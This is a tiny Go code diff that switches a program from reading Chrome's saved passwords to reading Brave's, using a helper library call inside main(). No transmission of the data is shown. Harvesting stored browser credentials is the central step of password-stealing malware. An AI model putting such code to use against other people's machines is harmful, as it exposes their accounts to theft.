@@ -6,7 +6,7 @@ import (
 )
 
 func main() {
-	cookies, err := browser.ReadChromePasswords()
+	cookies, err := browser.ReadBravePasswords()
 	if err != nil {
 		panic(err)
 	}
